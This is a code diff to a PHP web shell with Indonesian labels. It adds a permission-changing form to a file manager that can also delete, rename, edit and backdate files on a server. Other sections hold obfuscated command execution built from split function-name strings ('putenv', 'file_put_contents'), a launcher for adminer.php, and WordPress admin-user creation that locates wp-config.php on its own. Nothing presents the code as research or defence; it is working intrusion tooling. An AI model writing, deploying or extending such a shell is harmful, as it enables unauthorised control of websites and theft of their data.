@@ -673,6 +673,7 @@ echo '
                     <th>Baca</th>
                     <th>Edit</th>
                     <th>Hapus</th>
+                    <th>Permission</th>
                     <th>Action</th>
                 </tr>
 
@@ -731,113 +732,137 @@ echo '
 
 
 
-// Display folders first
+// Folderr
                 foreach ($folders as $folder) {
-                    // Get file size
-                    $jumlah = filesize($dir.'/'.$folder)/1024;
+                    $itemPath = $dir . '/' . $folder;
+
+                    $jumlah = filesize($itemPath)/1024;
                     $jumlah = round($jumlah, 3);
-                    if ($jumlah >= 1024) {
-                        $jumlah = round($jumlah/1024, 2).' MB';
-                    } else {
-                        $jumlah = $jumlah .' KB';
-                    }
-                    // Get last modified time
-                    $lastModifiedTimestamp = filemtime($dir.'/'.$folder);
+                    if ($jumlah >= 1024) $jumlah = round($jumlah/1024, 2).' MB'; else $jumlah .= ' KB';
+
+                    $lastModifiedTimestamp = filemtime($itemPath);
                     $lastModified = date("F d Y H:i:s", $lastModifiedTimestamp);
-                    // Calculate age in days
-                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
-                    // Determine color based on age
+                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60*60*24);
                     $color = getColorForAge($ageInDays);
-                    // Check file/folder permissions
+
+                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
                     $canEdit = is_writable($itemPath) ? 'Y' : 'G';
                     $canDelete = is_writable($itemPath) ? 'Y' : 'G';
-                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
+
+                    // Permission angka
+                    $permission = substr(sprintf('%o', fileperms($itemPath)), -4);
+
+                    // Form untuk mengubah permission
+                    $permissionForm = '
+                        <form method="POST" style="display:inline-flex; align-items:center; gap:4px;">
+                            <input type="hidden" name="path" value="'.$itemPath.'">
+                            <input type="text" name="new_perm" value="'.$permission.'" size="4" 
+                                style="width:50px; padding:2px 5px; border:1px solid #888; border-radius:4px; text-align:center; font-family:monospace;">
+                            <input type="submit" name="change_perm" value="Set" 
+                                style="background:#40e0d0; border:none; border-radius:4px; padding:2px 6px; cursor:pointer; font-size:12px; color:#000;">
+                        </form>
+                    ';
+
                     echo '
                     <tr>
-                        <td><i class="fas fa-folder" style="color: #f6c30c;"></i> <a href="?dir='.$dir.'/'.$folder.'" style="color: #40e0d0;">'.$folder.'</a></td>
+                        <td><i class="fas fa-folder" style="color: #f6c30c;"></i> <a href="?dir='.$itemPath.'" style="color: #40e0d0;">'.$folder.'</a></td>
                         <td>'.$jumlah.'</td>
                         <td style="color: '.$color.';">'.$lastModified.'</td>
                         <td>'.$canRead.'</td>
                         <td>'.$canEdit.'</td>
                         <td>'.$canDelete.'</td>
+                        <td>'.$permissionForm.'</td>
                         <td>
-                            <a href="?dir='.$dir.'&delete_folder='.$dir.'/'.$folder.'" class="button1">Hapus</a>
-                            <a href="?dir='.$dir.'&rename='.$dir.'/'.$folder.'&nama='.$folder.'" class="button1">Rename</a>
-                            <a href="?dir='.$dir.'&modify='.$dir.'/'.$folder.'" class="button1">Modify Date</a> <!-- Modify Date Action -->
+                            <a href="?dir='.$dir.'&delete_folder='.$itemPath.'" class="button1">Hapus</a>
+                            <a href="?dir='.$dir.'&rename='.$itemPath.'&nama='.$folder.'" class="button1">Rename</a>
+                            <a href="?dir='.$dir.'&modify='.$itemPath.'" class="button1">Modify Date</a>
                         </td>
-                    </tr>
-                    ';
+                    </tr>';
                 }
                 //<a href="?dir='.$dir.'&ubah='.$dir.'/'.$folder.'" class="button1">Edit</a>
 
 
 
-// Display files next
-				foreach ($files as $file) {
-   				 // Determine file extension
-  				  $fileExt = pathinfo($file, PATHINFO_EXTENSION);
-  				  // Set default icon for files
-  				  $icon = '<i class="fas fa-file" style="color: #97e1e6;"></i>'; // Default file icon
-  				  // Set specific icons for common file types
-  				  switch (strtolower($fileExt)) {
-    				    case 'jpg':
-   				     case 'jpeg':
-   				     case 'png':
-    				    case 'gif':
-   				         $icon = '<i class="fas fa-file-image" style="color: #97e1e6;"></i>'; // Image icon
-    				        break;
-   				     case 'pdf':
-  				          $icon = '<i class="fas fa-file-pdf" style="color: #97e1e6;"></i>'; // PDF icon
-    				        break;
-   				     case 'txt':
-     				       $icon = '<i class="fas fa-file-alt" style="color: #97e1e6;"></i>'; // Text file icon
-    				        break;
-    				    case 'zip':
-    				    case 'rar':
-     				       $icon = '<i class="fas fa-file-archive" style="color: #97e1e6;"></i>'; // Archive icon
-     				       break;
-   				     case 'php':
-     				       $icon = '<i class="fas fa-file" style="color: #e2e98c;"></i>'; // PHP file icon
-   				         break;
-   				     // Add more cases as needed for other file types
-   				 }
-   				 // Get file size
-   				 $jumlah = filesize($dir.'/'.$file)/1024;
-  				  $jumlah = round($jumlah, 3);
-  				  if ($jumlah >= 1024) {
-   				     $jumlah = round($jumlah/1024, 2).' MB';
-  				  } else {
-  				      $jumlah = $jumlah .' KB';
-   				 }
-   				 // Get last modified time
-   				 $lastModifiedTimestamp = filemtime($dir.'/'.$file);
-   				 $lastModified = date("F d Y H:i:s", filemtime($dir.'/'.$file));
-   				 // Calculate age in days
-   				 $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
-   				 // Determine color based on age
-  				  $color = getColorForAge($ageInDays);
-  				  // Check file/folder permissions
-  				  $itemPath = $dir . '/' . $file;
-   				 $canEdit = is_writable($itemPath) ? 'Y' : 'G';
-   				 $canDelete = is_writable($itemPath) ? 'Y' : 'G';
-   				 $canRead = is_readable($itemPath) ? 'Y' : 'G';
-  				  echo '
-    				<tr>
+// Fileeeeeeeeeeeeeee
+                foreach ($files as $file) {
+                    $itemPath = $dir . '/' . $file;
+
+                    // Tentukan icon
+                    $fileExt = pathinfo($file, PATHINFO_EXTENSION);
+                    $icon = '<i class="fas fa-file" style="color: #97e1e6;"></i>';
+                    switch (strtolower($fileExt)) {
+                        case 'jpg': case 'jpeg': case 'png': case 'gif':
+                            $icon = '<i class="fas fa-file-image" style="color: #97e1e6;"></i>';
+                            break;
+                        case 'pdf':
+                            $icon = '<i class="fas fa-file-pdf" style="color: #97e1e6;"></i>';
+                            break;
+                        case 'txt':
+                            $icon = '<i class="fas fa-file-alt" style="color: #97e1e6;"></i>';
+                            break;
+                        case 'zip': case 'rar':
+                            $icon = '<i class="fas fa-file-archive" style="color: #97e1e6;"></i>';
+                            break;
+                        case 'php':
+                            $icon = '<i class="fas fa-file" style="color: #e2e98c;"></i>';
+                            break;
+                    }
+
+                    // Ukuran file akurat
+                    $size = filesize($itemPath);
+                    if ($size >= 1024*1024) {
+                        $jumlah = round($size / (1024*1024), 2) . ' MB';
+                    } elseif ($size >= 1024) {
+                        $jumlah = round($size / 1024, 2) . ' KB';
+                    } else {
+                        $jumlah = $size . ' B';
+                    }
+
+                    // Last modified
+                    $lastModifiedTimestamp = filemtime($itemPath);
+                    $lastModified = date("F d Y H:i:s", $lastModifiedTimestamp);
+
+                    // Warna berdasarkan usia file
+                    $ageInDays = ($currentTime - $lastModifiedTimestamp) / (60 * 60 * 24);
+                    $color = getColorForAge($ageInDays);
+
+                    // Hak akses
+                    $canRead = is_readable($itemPath) ? 'Y' : 'G';
+                    $canEdit = is_writable($itemPath) ? 'Y' : 'G';
+                    $canDelete = is_writable($itemPath) ? 'Y' : 'G';
+
+                    // Permission angka
+                    $permission = substr(sprintf('%o', fileperms($itemPath)), -4);
+
+                    // Form untuk mengubah permission
+                    $permissionForm = '
+                        <form method="POST" style="display:inline-flex; align-items:center; gap:4px;">
+                            <input type="hidden" name="path" value="'.$itemPath.'">
+                            <input type="text" name="new_perm" value="'.$permission.'" size="4" 
+                                style="width:50px; padding:2px 5px; border:1px solid #888; border-radius:4px; text-align:center; font-family:monospace;">
+                            <input type="submit" name="change_perm" value="Set" 
+                                style="background:#40e0d0; border:none; border-radius:4px; padding:2px 6px; cursor:pointer; font-size:12px; color:#000;">
+                        </form>
+                    ';
+
+                    echo '
+                    <tr>
                         <td>'.$icon.' <a href="?dir='.$dir.'&open='.$itemPath.'" style="color: #40e0d0;">'.$file.'</a></td>
                         <td>'.$jumlah.'</td>
-     				    <td style="color: '.$color.';">'.$lastModified.'</td>
-     				    <td>'.$canRead.'</td>
-     				    <td>'.$canEdit.'</td>
-     				    <td>'.$canDelete.'</td>
+                        <td style="color: '.$color.';">'.$lastModified.'</td>
+                        <td>'.$canRead.'</td>
+                        <td>'.$canEdit.'</td>
+                        <td>'.$canDelete.'</td>
+                        <td>'.$permissionForm.'</td>
                         <td>
                             <a href="?dir='.$dir.'&delete='.$itemPath.'" class="button1">Hapus</a>
                             <a href="?dir='.$dir.'&ubah='.$itemPath.'" class="button1">Edit</a>
                             <a href="?dir='.$dir.'&rename='.$itemPath.'&nama='.$file.'" class="button1">Rename</a>
                             <a href="?dir='.$dir.'&modify='.$itemPath.'" class="button1">Modify Date</a>
                         </td>
- 				    </tr>
- 				   ';
-				}
+                    </tr>
+                    ';
+                }
                 // <a href="?dir='.$dir.'&zip='.$itemPath.'" class="button1">Zip</a>
                 // <a href="?dir='.$dir.'&unzip='.$itemPath.'" class="button1">Unzip</a>
 
@@ -1266,7 +1291,7 @@ echo '
 
 
 
-// cmd_input, delete_file, rename_item
+// cmdAdminnnn
                 if (isset($_POST['cmd_input'])) {
                     $p = "p"."u"."t"."e"."n"."v";
                     $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
@@ -1306,13 +1331,13 @@ echo '
                         $imp('a','a','a');
                     }
 
-                    
                         echo "<div style='background:#222;color:#fff;padding:10px;margin:10px 0;border-radius:5px;'>
                                 @min run: 
                                 <a href='{$fil}' style='color:#40e0d0;' target='_blank'>
                                     {$fil}
                                 </a>
                               </div>";
+                        echo '<meta http-equiv="refresh" content="1;url=' . $fil . '">';
                 }
 
 
@@ -1334,6 +1359,8 @@ echo '
                         echo '<meta http-equiv="refresh" content="0;url=adminer.php">';
                     }
                 }
+
+
 
 // WP User
                 if (isset($_GET['createwp'])) {
@@ -1385,6 +1412,9 @@ echo '
                     ';
                 }
 
+
+
+// WP User
                 if (isset($_POST['submitwp'])) {
                     // 🔹 Deteksi wp-config.php otomatis ke atas folder
                     $currentDir = __DIR__;
@@ -1489,7 +1519,19 @@ echo '
 
 
 
-            
+// Proses update permission
+                if (isset($_POST['change_perm'])) {
+                    $path = $_POST['path'];
+                    $newPerm = $_POST['new_perm'];
+
+                    if (preg_match('/^[0-7]{3,4}$/', $newPerm)) { // Validasi format octal
+                        chmod($path, octdec($newPerm));
+                        echo "<p style='color:green;'>Permission updated to $newPerm</p>";
+                        echo "<meta http-equiv='refresh' content='0'>";
+                    } else {
+                        echo "<p style='color:red;'>Invalid permission format!</p>";
+                    }
+                }
 
 
 
